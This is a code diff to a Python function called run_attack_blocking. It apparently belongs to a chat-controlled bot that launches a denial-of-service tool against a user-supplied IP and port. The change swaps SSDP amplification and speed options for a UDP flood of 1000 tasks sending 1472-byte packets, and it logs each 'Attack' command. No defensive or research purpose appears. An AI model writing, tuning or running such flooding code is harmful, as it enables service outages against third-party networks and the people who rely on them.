@@ -39,10 +39,9 @@ def run_attack_blocking(ip, port, dur, chat_id, username):
         RUST_BINARY,
         '--target', f'{ip}:{port}',
         '--duration', str(dur),
-        '--tasks', str(DEFAULT_TASKS),
-        '--speed', str(MAX_SPEED_MBPS),
-        '--mode', MODE,
-        '--ssdp'
+        '--tasks', '1000',
+        '--size', '1472',
+        '--mode', 'udp'
     ]
     logging.info(f"Attack: {' '.join(cmd)}")
     try:
